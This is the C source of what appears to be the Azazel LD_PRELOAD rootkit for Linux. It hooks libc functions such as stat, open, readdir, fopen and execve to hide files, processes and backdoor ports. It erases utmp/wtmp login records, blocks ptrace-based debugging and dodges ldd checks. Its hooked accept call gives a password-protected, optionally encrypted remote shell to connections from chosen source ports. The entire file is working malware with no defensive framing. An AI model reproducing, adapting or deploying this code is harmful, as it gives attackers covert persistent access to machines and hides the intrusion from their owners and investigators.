#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <limits.h>
#include <errno.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <pty.h>
#include <signal.h>
#include <utmp.h>
#include <dirent.h>

#include "crypthook.h"
#include "xor.h"
#include "const.h"
#include "azazel.h"

// This shows up in strings... just because
char *azazel="The whole earth has been corrupted through the works that were taught by Azazel: to him ascribe all sin.";
	
void cleanup(void *var, int len) {
	DEBUG("cleanup called %s\n", var);
	memset(var, 0x00, len);
	free(var);
}

int is_owner(void) {
	init();
	static int owner = -1; // Only initiate once.
	if (owner != -1) 
		return owner;
	char *hide_term_str = strdup(HIDE_TERM_STR);
	x(hide_term_str);
	char *hide_term_var = getenv(hide_term_str);
	if (hide_term_var != NULL) {
		/* This is an owner shell... cleanup the logs */
		char *pterm = ttyname(0);
		char *ptr = pterm+5;
		clean_wtmp(ptr,0);
		clean_utmp(ptr,0);
		owner = 1;
	}
	else 
		owner = 0;
	cleanup(hide_term_str, strlen(hide_term_str));
	return owner;
}

void clean_wtmp(char *pts, int verbose) {
	DEBUG("clean_wtmp\n");
	struct utmp utmp_ent;
	char *wtmp_file = strdup(WTMP_FILE_X);
	int fd;
	x(wtmp_file);
	if((fd=(long)syscall_list[SYS_OPEN].syscall_func(wtmp_file,O_RDWR))>=0){
		lseek(fd,0,SEEK_SET);
		while(read(fd,&utmp_ent,sizeof(utmp_ent))>0){
			if(!strncmp(utmp_ent.ut_line,pts,strlen(pts))){
				memset(&utmp_ent,0x00,sizeof(utmp_ent));
				lseek(fd,-(sizeof(utmp_ent)),SEEK_CUR);
				write(fd,&utmp_ent,sizeof(utmp_ent));
			}
		}
		close(fd);
	}
	if (verbose) {
		char *wtmp_msg = strdup(WTMP_MSG);
		x(wtmp_msg);
		printf("%s\n",wtmp_msg);
		cleanup(wtmp_msg, strlen(wtmp_msg));
	}
	cleanup(wtmp_file, strlen(wtmp_file));
}

void clean_utmp(char *pts, int verbose) {
	DEBUG("clean_utmp\n");
	struct utmp utmp_ent;
	char *utmp_file = strdup(UTMP_FILE_X);
	int fd;
	x(utmp_file);
	if((fd=(long)syscall_list[SYS_OPEN].syscall_func(utmp_file,O_RDWR))>=0){
		lseek(fd,0,SEEK_SET);
		while(read(fd,&utmp_ent,sizeof(utmp_ent))>0){
			if(!strncmp(utmp_ent.ut_line,pts,strlen(pts))){
				memset(&utmp_ent,0x00,sizeof(utmp_ent));
				lseek(fd,-(sizeof(utmp_ent)),SEEK_CUR);
				write(fd,&utmp_ent,sizeof(utmp_ent));
			}
		}
		close(fd);
	}
	if (verbose) {
		char *utmp_msg = strdup(UTMP_MSG);
		x(utmp_msg);
		printf("%s\n",utmp_msg);
		cleanup(utmp_msg, strlen(utmp_msg));
	}
	cleanup(utmp_file, strlen(utmp_file));
}

void azazel_init(void) {
	DEBUG("[-] azazel.so loaded.\n");
	int i, fd;
	
	if (constr)
		return;
	constr=1;
	
	for (i = 0; i < SYSCALL_SIZE; ++i) {
		char *scall = strdup(syscall_table[i]);
		x(scall);
		strncpy(syscall_list[i].syscall_name, scall, 50);
		syscall_list[i].syscall_func = dlsym(RTLD_NEXT, scall);
		cleanup(scall,strlen(scall));
	}
}

void init(void) {
	azazel_init();
}

long ptrace(void *request, pid_t pid, void *addr, void *data) {
	char *anti_debug_msg = strdup(ANTI_DEBUG_MSG);
	x(anti_debug_msg);
	printf("%s\n",anti_debug_msg);
	cleanup(anti_debug_msg, strlen(anti_debug_msg));
	exit(-1);
}

int parse_environ(char *stack, int len, char *needle) {
	DEBUG("parse_environ\n");
	char *step = stack;
	
	while(1) {
		if (strstr(step,needle))
			return 1;
		if (*step+1 != '\0') {
			step++;
			if (step-stack >= len) {
				return 0;
			}
		} else
			return 0;
	}
}

int is_invisible(const char *path) {
	DEBUG("is_invisible\n");
	struct stat s_fstat;
	char line[MAX_LEN];
	char p_path[PATH_MAX];
	char *config_file = strdup(CONFIG_FILE);
	FILE *cmd;	
	int fd;
	
	init();

	x(config_file);
	if(strstr(path, MAGIC_STRING) || strstr(path, config_file)) {
		cleanup(config_file, strlen(config_file));
		return 1;
	}
	char *proc_path = strdup(PROC_PATH);
	x(proc_path);
	if(strstr(path, proc_path)){
		cleanup(proc_path,strlen(proc_path));
		if((long) syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, path, &s_fstat) != -1){
			char *cmd_line = strdup(CMD_LINE);
			char *env_line = strdup(ENV_LINE);
			x(cmd_line);
			x(env_line);
			snprintf(p_path, PATH_MAX, env_line, path);
			cleanup(cmd_line,strlen(cmd_line));
			cleanup(env_line, strlen(env_line));
			if((long)(syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, p_path, &s_fstat)) != -1){	
				cmd = syscall_list[SYS_FOPEN].syscall_func(p_path, "r");
				if(cmd){
					char *hide_term_str = strdup(HIDE_TERM_STR);
					x(hide_term_str);
					int res;
					char *step = &line[0];
					while((res=fgets(line, MAX_LEN, cmd) != NULL)) {
						if (parse_environ(line, MAX_LEN, hide_term_str) == 1) {
							cleanup(config_file, strlen(config_file));
							cleanup(hide_term_str, strlen(hide_term_str));
							return 1;
						}
						memset(line,0x00,MAX_LEN);
					}
					fclose(cmd);				
				}
			}
		}
	} else {
		cleanup(proc_path,strlen(proc_path));
	}
	cleanup(config_file,strlen(config_file));
	return 0;
}

int is_procnet(const char *filename) {
	DEBUG("is_procnet\n");
	char *proc_net_tcp = strdup(PROC_NET_TCP);
	char *proc_net_tcp6 = strdup(PROC_NET_TCP6);
	x(proc_net_tcp);
	x(proc_net_tcp6);
	
	if (strcmp (filename, proc_net_tcp) == 0
		|| strcmp (filename, proc_net_tcp6) == 0) {
		cleanup(proc_net_tcp,strlen(proc_net_tcp));
		cleanup(proc_net_tcp6,strlen(proc_net_tcp6));
		return 1;
	}

	cleanup(proc_net_tcp,strlen(proc_net_tcp));
	cleanup(proc_net_tcp6,strlen(proc_net_tcp6));
	return 0;
}

FILE *hide_ports(const char *filename) {
	DEBUG("hide_ports called\n");
	char line[LINE_MAX];
	char *proc_net_tcp = strdup(PROC_NET_TCP);
	char *proc_net_tcp6 = strdup(PROC_NET_TCP6);

	init();
	x(proc_net_tcp);
	x(proc_net_tcp6);
	
	unsigned long rxq, txq, time_len, retr, inode;
	int local_port, rem_port, d, state, uid, timer_run, timeout;
	char rem_addr[128], local_addr[128], more[512];

	FILE *tmp = tmpfile();
	FILE *pnt = syscall_list[SYS_FOPEN].syscall_func(filename, "r"); 

	while (fgets(line, LINE_MAX, pnt) != NULL) {
		char *scanf_line = strdup(SCANF_LINE);
		x(scanf_line);
		sscanf(line,
    			scanf_line,
		 	&d, local_addr, &local_port, rem_addr, &rem_port, &state,
		 	&txq, &rxq, &timer_run, &time_len, &retr, &uid, &timeout, &inode, more);
		cleanup(scanf_line,strlen(scanf_line));

		if((rem_port >= LOW_PORT && rem_port <= HIGH_PORT) || (rem_port >= CRYPT_LOW && rem_port <= CRYPT_HIGH) || (rem_port == PAM_PORT)){
			continue;
		} else{				
			if((local_port >= LOW_PORT && local_port <= HIGH_PORT) || (local_port >= CRYPT_LOW && local_port >= CRYPT_HIGH) || (local_port == PAM_PORT)){
				continue;
			}else{	
				fputs(line, tmp);	
			}
		}
	}	
	
	cleanup(proc_net_tcp,strlen(proc_net_tcp));
	cleanup(proc_net_tcp6,strlen(proc_net_tcp6));
	fclose(pnt);
	fseek(tmp, 0, SEEK_SET);
	return tmp;
}

int access(const char *path, int amode) {
	DEBUG("access hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_ACCESS].syscall_func(path, amode);
	
	if(is_invisible(path)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_ACCESS].syscall_func(path,amode);
}

FILE *fopen (const char *filename, const char *mode) {
	DEBUG("fopen hooked %s.\n", filename);
	if (is_owner()) 
		syscall_list[SYS_FOPEN].syscall_func(filename, mode);

	if (is_procnet(filename))
		return hide_ports(filename);

	if (is_invisible(filename)) {
		errno = ENOENT;
		return NULL;
	}
	return syscall_list[SYS_FOPEN].syscall_func(filename, mode);
}

FILE *fopen64 (const char *filename, const char *mode) {
	DEBUG("fopen hooked %s.\n", filename);
	if (is_owner()) 
		return syscall_list[SYS_FOPEN64].syscall_func(filename, mode);

	if (is_procnet(filename))
		return hide_ports(filename);
	
	if (is_invisible(filename)) {
		errno = ENOENT;
		return NULL;
	}

	return syscall_list[SYS_FOPEN64].syscall_func(filename, mode);
}

int lstat(const char *file, struct stat *buf) {
	DEBUG("lstat hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_LXSTAT].syscall_func(_STAT_VER, file, buf);
	
	if(is_invisible(file)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_LXSTAT].syscall_func(_STAT_VER, file, buf);
}

int lstat64(const char *file, struct stat64 *buf) {
	DEBUG("lstat64 hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_LXSTAT64].syscall_func(_STAT_VER, file, buf);

	if (is_invisible(file)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_LXSTAT64].syscall_func(_STAT_VER, file, buf);
}

int __lxstat(int ver, const char *file, struct stat *buf) {
	DEBUG("__lxstat hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_LXSTAT].syscall_func(ver, file, buf);

	if (is_invisible(file)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_LXSTAT].syscall_func(ver, file, buf);
}

int __lxstat64(int ver, const char *file, struct stat64 *buf) {
	DEBUG("__lxstat64 hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_LXSTAT64].syscall_func(ver, file, buf);

	if(is_invisible(file)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_LXSTAT64].syscall_func(ver, file, buf);
}

int open(const char *pathname, int flags, mode_t mode) {
	DEBUG("open hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_OPEN].syscall_func(pathname, flags, mode);
		
	if(is_invisible(pathname)) {
				errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_OPEN].syscall_func(pathname,flags,mode);
}

int rmdir(const char *pathname) {
	DEBUG("rmdir hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_RMDIR].syscall_func(pathname);

	if(is_invisible(pathname)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_RMDIR].syscall_func(pathname);
}

int stat(const char *path, struct stat *buf) {
	DEBUG("stat hooked\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, path, buf);
	
	if(is_invisible(path)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, path, buf);
}

int stat64(const char *path, struct stat64 *buf) {
	DEBUG("stat64 hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, path, buf);
	
	if(is_invisible(path)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_XSTAT64].syscall_func(_STAT_VER, path, buf);
}

int __xstat(int ver, const char *path, struct stat *buf) {
	DEBUG("xstat hooked. path: %s\n",path);
	if (is_owner()) 
		return (long)syscall_list[SYS_XSTAT].syscall_func(ver, path, buf);
	
	if(is_invisible(path)) {
		DEBUG("File is invisble.\n");
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_XSTAT].syscall_func(ver,path, buf);
}

int __xstat64(int ver, const char *path, struct stat64 *buf) {
	DEBUG("xstat64 hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_XSTAT64].syscall_func(ver, path, buf);
	
	if(is_invisible(path)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_XSTAT64].syscall_func(ver,path, buf);
}

int unlink(const char *pathname) {
	DEBUG("unlink hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_UNLINK].syscall_func(pathname);

	if(is_invisible(pathname)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_UNLINK].syscall_func(pathname);
}

int unlinkat(int dirfd, const char *pathname, int flags) {
	DEBUG("unlinkat hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_UNLINKAT].syscall_func(dirfd, pathname, flags);

	if(is_invisible(pathname)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_UNLINKAT].syscall_func(dirfd, pathname, flags);
}

DIR *opendir(const char *name) {
	DEBUG("opendir hooked.\n");
	if (is_owner()) 
		return syscall_list[SYS_OPENDIR].syscall_func(name);

	if(is_invisible(name)) {
		errno = ENOENT;
		return NULL;
	}

	return syscall_list[SYS_OPENDIR].syscall_func(name);
}

struct dirent *readdir(DIR *dirp) {
	DEBUG("readdir hooked.\n");
	if (is_owner()) 
		return syscall_list[SYS_READDIR].syscall_func(dirp);
	struct dirent *dir;
	do {
		dir = syscall_list[SYS_READDIR].syscall_func(dirp);

		if (dir != NULL && (strcmp(dir->d_name,".\0") || strcmp(dir->d_name,"/\0"))) 
			continue;

		if(dir != NULL) {
			char path[PATH_MAX + 1];
			char *proc_str = strdup(PROC_STR);
			x(proc_str);
			snprintf(path, PATH_MAX, proc_str, dir->d_name);
			cleanup(proc_str,strlen(proc_str));
			
			if(is_invisible(path) || strstr(path, MAGIC_STRING)) {
				continue;
			}
		}

	} while(dir && is_invisible(dir->d_name));

	return dir;
}

struct dirent64 *readdir64(DIR *dirp) {
	DEBUG("readdir64 hooked.\n");
	if (is_owner()) 
		return syscall_list[SYS_READDIR64].syscall_func(dirp);
	struct dirent64 *dir;
	do {
		dir = syscall_list[SYS_READDIR64].syscall_func(dirp);

		if (dir != NULL && (strcmp(dir->d_name,".\0") || strcmp(dir->d_name,"/\0"))) 
			continue;

		if(dir != NULL) {
			char path[PATH_MAX + 1];
			char *proc_str = strdup(PROC_STR);
			x(proc_str);
			snprintf(path, PATH_MAX, proc_str, dir->d_name);
			cleanup(proc_str,strlen(proc_str));
			
			if(is_invisible(path) || strstr(path, MAGIC_STRING)) {
				continue;
			}
		}
		
	} while(dir && is_invisible(dir->d_name));
	return dir;
}

int link(const char *oldpath, const char *newpath) {
	DEBUG("link hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_LINK].syscall_func(oldpath, newpath);

	if(is_invisible(oldpath)) {
		errno = ENOENT;
		return -1;
	}

	return (long)syscall_list[SYS_LINK].syscall_func(oldpath, newpath);
}

int execve(const char *path, char *const argv[], char *const envp[]) {
	DEBUG("execve hooked. path: %s\n",path);
	char *unhide = strdup(C_UNHIDE);
	char *ldd = strdup(C_LDD);
	char *ld_linux = strdup(LD_LINUX);
	char *ld_trace = strdup(LD_TRACE);
	x(ld_trace);
	char *trace_var = getenv(ld_trace);
	cleanup(ld_trace,strlen(ld_trace));

	char buf[65535];
	int pid, ret;
	int child_stdin[2];
    int child_stdout[2];

	init();
	x(unhide);
	x(ldd);
	x(ld_linux);
	
	char *cleanup_str = strdup(CLEANUP_LOGS);
	x(cleanup_str);
	char *cleanvar = getenv(cleanup_str);
	
	if (cleanvar != NULL) {
		clean_utmp(cleanvar, 1);
		clean_wtmp(cleanvar, 1);
		
		unsetenv(cleanup_str);
		cleanup(cleanup_str, strlen(cleanup_str));
		cleanup(unhide, strlen(unhide));
		cleanup(ldd,strlen(ldd));
		cleanup(ld_linux,strlen(ld_linux));
		exit(0);
	}
	cleanup(cleanup_str, strlen(cleanup_str));
	
	if (strstr(path, ldd) || strstr(path, ld_linux) || trace_var != NULL || strstr(path, unhide)) { 
		uid_t oid= getuid(); // This method will be changed in the next version.
		char *ld_normal = strdup(LD_NORMAL);
		char *ld_hide = strdup(LD_HIDE);
		x(ld_normal);
		x(ld_hide);

		setuid(0);
		rename(ld_normal, ld_hide);
		if ((pid=fork()) == -1) {
			cleanup(ld_normal, strlen(ld_normal));
			cleanup(ld_hide, strlen(ld_hide));
			return -1;
		} else if (pid == 0) {
			cleanup(ld_normal, strlen(ld_normal));
			cleanup(ld_hide, strlen(ld_hide));
			return (long)syscall_list[SYS_EXECVE].syscall_func(path, argv, NULL);
		} else {
			
		}
		wait(&ret);
		
		rename(ld_hide, ld_normal);
		setuid(oid);
		cleanup(ld_normal, strlen(ld_normal));
		cleanup(ld_hide, strlen(ld_hide));
	} else {
		ret = (long)syscall_list[SYS_EXECVE].syscall_func(path, argv, envp);
	}
    
	cleanup(unhide,strlen(unhide));
	cleanup(ldd,strlen(ldd));
	cleanup(ld_linux,strlen(ld_linux));
	exit(ret);
}

void shell_loop(int sock, int pty, int crypt) {
	DEBUG("shell_loop called.\n");
	fd_set fds;
	char buf[MAX_LEN];
    int res, maxfd;
    
    ssize_t (*s_read)();
	ssize_t (*s_write)();
	
	if (crypt) {
		s_read = crypt_read;
		s_write = crypt_write;
	} else {
		char *sys_write = strdup(SYS_WRITE);
		char *sys_read = strdup(SYS_READ);
		x(sys_write);
		x(sys_read);
		s_read = dlsym(RTLD_NEXT, sys_read);
		s_write = dlsym(RTLD_NEXT, sys_write);
		cleanup(sys_write,strlen(sys_write));
		cleanup(sys_read,strlen(sys_read));
	}

	maxfd = pty;    
	if (sock > maxfd)
		maxfd = sock;
		
	while(1) {
		FD_ZERO(&fds);
		FD_SET(sock, &fds);
		FD_SET(pty, &fds);
	
		if((res = select(maxfd+1, &fds, NULL, NULL, NULL)) == -1)
			DEBUG("Select failed.\n");
		
		if(FD_ISSET(sock, &fds)) {
			memset(&buf, 0x00, MAX_LEN);
			if((res = s_read(sock, buf, MAX_LEN)) <= 0) {
				DEBUG("Error reading from client\n");
				exit(1);
			} else {
				write(pty, buf, res);
			}
		}
	
		if(FD_ISSET(pty, &fds)) {
			memset(&buf, 0x00, MAX_LEN);
			if((res = read(pty, buf, MAX_LEN-31)) <= 0) {
				DEBUG("Error reading from pty\n");
				exit(1);
			} else {
				s_write(sock, buf, res);
			}
		} 
	}
}

void setup_pty(int sock, int *pty, int *tty) {
	DEBUG("setup_pty called.\n");
	char *args[] = {strdup(SHELL_TYPE), "-l", 0};
    char *env[] = { strdup(HIDE_TERM_VAR), strdup(HIST_FILE), strdup(TERM), 0};
    
	close(0);
	close(1);
	close(2);
	close(*pty);	
	close(sock);
		
	setsid();
	ioctl(*tty, TIOCSCTTY);
	
	signal(SIGHUP, SIG_DFL);
	signal(SIGCHLD, SIG_DFL);
	
	dup2(*tty, 0);
	dup2(*tty, 1);
	dup2(*tty, 2);
	
	x(args[0]);
	x(env[0]);
	x(env[1]);
	x(env[2]);
	
	execve(args[0], args, env);
	cleanup(args[0],strlen(args[0]));
	cleanup(env[0],strlen(env[0]));
	cleanup(env[1],strlen(env[1]));
	cleanup(env[2], strlen(env[2]));
}

int check_shell_password(int sock, int crypt) {
	DEBUG("check_shell_password called.\n");
	char buffer[512];
	char *shell_passwd = strdup(SHELL_PASSWD);
	x(shell_passwd);
	memset(buffer, 0x00, sizeof(buffer));
	if (crypt) {
		crypt_read(sock,buffer,sizeof(buffer)-1);
		if (strstr(buffer, shell_passwd)) {
			cleanup(shell_passwd, strlen(shell_passwd));
			return 1;
		}
	} else {
		read(sock, buffer, sizeof(buffer));
		if(strstr(buffer, shell_passwd)) {
			cleanup(shell_passwd, strlen(shell_passwd));
			return 1;
		}
	}
	return -1;
}

int drop_shell(int sock, struct sockaddr *addr) {
	DEBUG("drop_shell called.\n");
	char buffer[512];
	char *shell_passwd = strdup(SHELL_PASSWD);
	char *shell_msg = strdup(SHELL_MSG);
	int crypt_mode = -1;
	int pid, pty, tty;
	
	ssize_t (*s_write)();
	
	init();
	x(shell_msg);
	x(shell_passwd);
	
	char buf[MAX_LEN];

	memset(buffer,0x00,sizeof(buffer));

	struct sockaddr_in *sa_i = (struct sockaddr_in*)addr;

	if(htons(sa_i->sin_port) >= LOW_PORT && htons(sa_i->sin_port) <= HIGH_PORT) {
		crypt_mode = PLAIN_SHELL;
		char *sys_write = strdup(SYS_WRITE);
		x(sys_write);
		s_write = dlsym(RTLD_NEXT, sys_write);
		cleanup(sys_write, strlen(sys_write));
	 } else if (htons(sa_i->sin_port) >= CRYPT_LOW && htons(sa_i->sin_port) <= CRYPT_HIGH) {
		crypt_mode = CRYPT_SHELL;
		s_write = crypt_write;
	 } else
		return sock;
	
	if(check_shell_password(sock, crypt_mode) != 1) {
		shutdown(sock, SHUT_RDWR);
		close(sock);
		return -1;
	}
		
	s_write(sock, shell_msg, strlen(shell_msg));
	char pty_name[51];
	if (openpty(&pty, &tty, pty_name, NULL, NULL) == -1) {
		DEBUG("Failed to grab pty\n");
		return;
	}
	
	char *ptr = &pty_name[5]; // Jump past /dev/ and clean the logs
	clean_utmp(ptr, 0);
	clean_wtmp(ptr, 0);

	/* Fork child process to start an interactive shell */
	if ((pid=fork()) == -1) {
		return -1;
	} else if (pid == 0) {
		setup_pty(sock, &pty, &tty);
	} else {
		close(tty);
	}
	
	/* Fork child process to run the pipes for the shell */
	if ((pid=fork()) == -1)
		return -1;
	else if (pid == 0) 
		shell_loop(sock, pty, crypt_mode);
	else {
		close(sock);
		close(pty);
		errno = ECONNABORTED;
		return -1;
	}
}

int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
	DEBUG("accept hooked.\n");
	if (is_owner()) 
		return (long)syscall_list[SYS_ACCEPT].syscall_func(sockfd, addr, addrlen);
	
	int sock = (long)syscall_list[SYS_ACCEPT].syscall_func(sockfd, addr, addrlen);

	return drop_shell(sock, addr);
}
